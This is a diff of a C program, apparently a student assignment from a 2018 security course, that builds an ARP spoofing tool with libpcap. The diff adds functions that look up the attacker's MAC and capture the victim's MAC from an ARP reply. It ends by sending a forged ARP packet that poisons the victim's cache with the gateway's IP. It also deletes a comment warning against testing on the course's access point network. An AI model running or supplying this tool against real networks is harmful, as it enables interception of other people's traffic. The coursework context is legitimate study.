@@ -19,31 +19,21 @@
 #include <netinet/in.h>
 #include <linux/ip.h>
 #include <unistd.h>
+#include <stdlib.h> 
 
 #define ETHERSIZE 14
 #define IPADDRLEN 4
+
 
 /*
 패킷 보냄 - arp 
 victim과 gateway의 ip, mac을 알아내고 속이기..
 
-pcap_sendpacket 함수 이용...
-
-
 [리포트]
 sender(victim)의 arp table을 변조하라.
 
-sender ip는 victim ip라고도 함.
-target ip는 일반적으로 gateway임.
 
 [학습]
-구글링을 통해서 arp header의 구조(각 필드의 의미)를 익힌다.
-
-
-
-pcap_sendpacket 함수를 이용해서 user defined buffer를 packet으로 전송하는 방법을 익힌다.
-
-attacker(자신) mac 정보를 알아 내는 방법은 구글링을 통해서 코드를 베껴 와도 된다.
 
 arp infection packet 구성에 필요한 sender mac 정보는 프로그램 레벨에서 자동으로(정상적인 arp request를 날리고 그 arp reply를 받아서) 알아 오도록 코딩한다.
 
@@ -52,11 +42,14 @@ arp infection packet 구성에 필요한 sender mac 정보는 프로그램 레�
 [제출 기한]
 2018.08.06 23:59
 
-절대 KITRI access point 네트워크를 대상으로 테스트하지 말 것. 하려면 핫스팟을 띄워 하거나 BoBDev 라는 access point를 사용할 것.
-
 */
 
- pcap_t * handle;
+pcap_t * handle;
+uint8_t myMAC[ETH_ALEN];
+uint8_t victimMAC[ETH_ALEN];
+
+uint32_t victimIP ;
+uint32_t targetIP ;
 
 #pragma pack(1) //패딩 삭제
 typedef struct myArphdr
@@ -135,6 +128,85 @@ bool SendARP(uint8_t arpType, uint8_t *buf, uint8_t * dstMAC, uint8_t * srcMAC, 
 }
 
 
+void GetMyMAC(uint8_t * interface, uint8_t * myMAC)
+{
+    //내 MAC 얻기
+    struct ifreq s;
+    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
+
+    strcpy(s.ifr_name, (char *)interface);
+    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) 
+    {
+        memcpy(myMAC, s.ifr_addr.sa_data, ETH_ALEN);
+    }
+    else
+    {
+        printf("Fail to get my MAC address!\n");
+        exit(1);
+    }
+}
+
+
+
+
+
+bool IsARPNext(uint16_t ethType)
+{
+  if (ntohs(ethType) == ETHERTYPE_ARP)
+    return true;
+  else  
+    return false;
+
+} 
+
+
+bool IsARPVictim(uint32_t ip)
+{
+    if (victimIP == ip)
+        return true;
+    else
+        return false;
+}
+
+bool IsARPResponse(uint8_t * packet)
+{
+
+    struct ether_header * eth = (struct ether_header *)packet;
+
+    //----- check MAC -----
+
+    //받는 패킷인지 체크
+    if(memcmp(eth->ether_dhost, myMAC, ETH_ALEN))
+    {
+       return false; 
+    }
+    //_____ check MAC ______
+
+
+    //----- check ARP -----
+
+    if(! IsARPNext(eth->ether_type))
+        return false;
+ 
+    //_____ check ARP _____
+
+    //ARP 패킷 떼기
+    ARPHDR * arp = (ARPHDR *)((uint8_t *)eth + ETHERSIZE);
+
+    //victim에게 온 것인지 체크
+    if(!IsARPVictim(arp->srcIP))
+    {
+        return false;
+    }
+
+    memcpy(victimMAC, eth->ether_shost, ETH_ALEN);
+
+    return true;
+
+}
+
+
+
 
 int main(int argc, char * argv[])
 {
@@ -158,40 +230,25 @@ int main(int argc, char * argv[])
     uint8_t buf[0x2a];
     memset(buf, 0, sizeof(buf));
 
-    uint32_t victimIP = inet_addr(argv[2]);
-    uint32_t targetIP = inet_addr(argv[3]);
-
-    uint8_t myMAC[ETH_ALEN];
+     victimIP = inet_addr(argv[2]);
+     targetIP = inet_addr(argv[3]);
 
 
+ 
+    GetMyMAC((uint8_t *)argv[1], myMAC);
 
-    //내 MAC 얻기
-    struct ifreq s;
-    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
-
-    strcpy(s.ifr_name, argv[1]);
-    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) 
-    {
-        memcpy(myMAC, s.ifr_addr.sa_data, ETH_ALEN);
-    }
-    else
-    {
-        printf("Fail to get my MAC address!\n");
-        return 1;
-    }
-
-    
     //피해자의 MAC을 알아온다
     //broadcast
     SendARP(ARPOP_REQUEST, buf, NULL, myMAC, victimIP, targetIP);
 
+    bool getResponse = false;
     //deadlock 조심
     //timeout 넣을까?
     //get response
-    while (true) 
+    while (!getResponse) 
     {
         struct pcap_pkthdr * header;
-        const u_int8_t * packet;
+        const uint8_t * packet;
         int i = 0;
 
         int res = pcap_next_ex(handle, &header, &packet);
@@ -199,18 +256,13 @@ int main(int argc, char * argv[])
         if (res == -1 || res == -2) break;
         
         //ARP 응답인지 체크
+        getResponse = IsARPResponse((uint8_t *)packet);
         
     }
 
 
-    //내 MAC을 알아온다
-
-    //패킷 생성
-    //ETHER
-    //      : reciever는 victim MAC
-    //      : sender는 내 MAC
-    //ARP
-    //      i'm target IP
+    //ARP spoofing
+    SendARP(ARPOP_REQUEST, buf, victimMAC, myMAC, victimIP, targetIP);
 
 
 }
